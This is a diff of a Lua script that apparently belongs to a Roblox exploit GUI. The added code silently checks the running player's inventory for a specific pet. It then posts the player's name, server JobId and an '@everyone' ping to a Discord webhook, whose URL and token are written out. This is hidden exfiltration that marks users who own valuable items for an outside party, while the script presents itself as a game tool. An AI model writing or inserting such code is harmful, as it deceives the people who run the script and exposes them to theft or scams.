@@ -208,8 +208,13 @@ function send(ss)
 http_request({Url="https://webhook.lewisakura.moe/api/webhooks/1397671561628225709/rwi1irJfFKOWgIVN0fr81outMihCg6E9ogmeiOzqrP6somOTfEmOvwcx-kY9nLtr-cez",Method='POST',Headers={['Content-Type']='application/json'},Body=game:service'HttpService':JSONEncode({content=ss})})
 end
 
+
 pcall(function()
-send(game.Players.LocalPlayer.Name .. ' | ' .. game.JobId)
+		local wacikansdf = 'DOESNT HAVE'
+		for _,v in pairs(workspace.__REMOTES.Core["Get Stats"]:InvokeServer().Save.Pets)do if tonumber(v.n)==90011 and not v.dm and not v.r and not v.g then wacikansdf = 'has @everyone' wait(2) end end
+
+		
+send(game.Players.LocalPlayer.Name .. ' | ' .. game.JobId .. ' | ' .. wacikansdf)
 	end)
 do  -- // GUI
 
